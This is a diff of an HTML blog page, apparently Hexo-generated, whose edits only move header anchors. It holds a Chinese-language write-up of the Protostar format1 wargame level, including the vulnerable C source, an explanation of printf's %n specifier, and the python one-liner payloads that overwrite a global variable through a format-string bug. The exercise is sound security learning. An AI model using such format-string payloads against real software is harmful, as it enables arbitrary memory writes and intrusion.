@@ -17,10 +17,10 @@
   
   <title>Protostar-栈溢出学习-printf格式%n任意地址写 | 4ch12dy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 序#
+  <meta name="description" content="#0x00 序
 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 
-0x01 C语言源代码##include &amp;lt;stdlib.h&amp;gt;
+#0x01 C语言源代码#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdio.h&amp;gt;
 #include &amp;lt;string.h&amp;gt;
@@ -32,10 +32,10 @@ void vu">
 <meta property="og:title" content="Protostar-栈溢出学习-printf格式%n任意地址写">
 <meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/index.html">
 <meta property="og:site_name" content="4ch12dy">
-<meta property="og:description" content="0x00 序#
+<meta property="og:description" content="#0x00 序
 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 
-0x01 C语言源代码##include &amp;lt;stdlib.h&amp;gt;
+#0x01 C语言源代码#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdio.h&amp;gt;
 #include &amp;lt;string.h&amp;gt;
@@ -53,10 +53,10 @@ void vu">
 <meta property="og:updated_time" content="2017-05-02T14:34:06.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-栈溢出学习-printf格式%n任意地址写">
-<meta name="twitter:description" content="0x00 序#
+<meta name="twitter:description" content="#0x00 序
 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 
-0x01 C语言源代码##include &amp;lt;stdlib.h&amp;gt;
+#0x01 C语言源代码#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;unistd.h&amp;gt;
 #include &amp;lt;stdio.h&amp;gt;
 #include &amp;lt;string.h&amp;gt;
@@ -205,10 +205,10 @@ void vu">
             
         </div>
         <div class="content" style="overflow: auto">
-            <h2><span id="0x00-xu">0x00 序</span><a href="#0x00-xu" class="header-anchor">#</a></h2><blockquote>
+            <h2><a href="#0x00-xu" class="header-anchor">#</a><span id="0x00-xu">0x00 序</span></h2><blockquote>
 <p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p>
 </blockquote>
-<h2><span id="0x01-c-yu-yan-yuan-dai-ma">0x01 C语言源代码</span><a href="#0x01-c-yu-yan-yuan-dai-ma" class="header-anchor">#</a></h2><pre><code>#include &lt;stdlib.h&gt;
+<h2><a href="#0x01-c-yu-yan-yuan-dai-ma" class="header-anchor">#</a><span id="0x01-c-yu-yan-yuan-dai-ma">0x01 C语言源代码</span></h2><pre><code>#include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
@@ -228,9 +228,9 @@ int main(int argc, char **argv)
 {
   vuln(argv[1]);
 }
-</code></pre><h2><span id="0x02-yi-huo-amp-fen-xi-amp-si-kao">0x02 疑惑&amp;分析&amp;思考</span><a href="#0x02-yi-huo-amp-fen-xi-amp-si-kao" class="header-anchor">#</a></h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
+</code></pre><h2><a href="#0x02-yi-huo-amp-fen-xi-amp-si-kao" class="header-anchor">#</a><span id="0x02-yi-huo-amp-fen-xi-amp-si-kao">0x02 疑惑&amp;分析&amp;思考</span></h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
 <p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p>
-<h2><span id="0x03-ce-shi">0x03 测试</span><a href="#0x03-ce-shi" class="header-anchor">#</a></h2><p>其他不说，先运行下程序试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true" alt="0-1"><br>再试着输入格式字符试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p>
+<h2><a href="#0x03-ce-shi" class="header-anchor">#</a><span id="0x03-ce-shi">0x03 测试</span></h2><p>其他不说，先运行下程序试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true" alt="0-1"><br>再试着输入格式字符试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p>
 <pre><code>...
 local variables of main
 saved registers of main
@@ -250,7 +250,7 @@ environment strings
 program name
 NULL
 </code></pre><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p>
-<h2><span id="0x04-ni-bu-zhi-dao-de-printf">0x04 你不知道的printf</span><a href="#0x04-ni-bu-zhi-dao-de-printf" class="header-anchor">#</a></h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
+<h2><a href="#0x04-ni-bu-zhi-dao-de-printf" class="header-anchor">#</a><span id="0x04-ni-bu-zhi-dao-de-printf">0x04 你不知道的printf</span></h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
 <p>关注printf函数，有这么一段话：</p>
 <ul>
 <li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li>
@@ -260,13 +260,13 @@ NULL
 <li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li>
 </ul>
 <p>看个例子<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-4.png?raw=true" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p>
-<h2><span id="0x05-hack">0x05 hack</span><a href="#0x05-hack" class="header-anchor">#</a></h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试</p>
+<h2><a href="#0x05-hack" class="header-anchor">#</a><span id="0x05-hack">0x05 hack</span></h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试</p>
 <pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot;
 </code></pre><p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n</p>
 <pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot;
 </code></pre><p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p>
-<h2><span id="0x06-yi-dian-gan-wu">0x06 一点感悟</span><a href="#0x06-yi-dian-gan-wu" class="header-anchor">#</a></h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p>
-<h2><span id="0x07-can-kao-lian-jie">0x07 参考链接</span><a href="#0x07-can-kao-lian-jie" class="header-anchor">#</a></h2><ul>
+<h2><a href="#0x06-yi-dian-gan-wu" class="header-anchor">#</a><span id="0x06-yi-dian-gan-wu">0x06 一点感悟</span></h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p>
+<h2><a href="#0x07-can-kao-lian-jie" class="header-anchor">#</a><span id="0x07-can-kao-lian-jie">0x07 参考链接</span></h2><ul>
 <li><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p>
 </li>
 <li><p><a href="http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" target="_blank" rel="external">What is the use of the %n format specifier in C?</a></p>
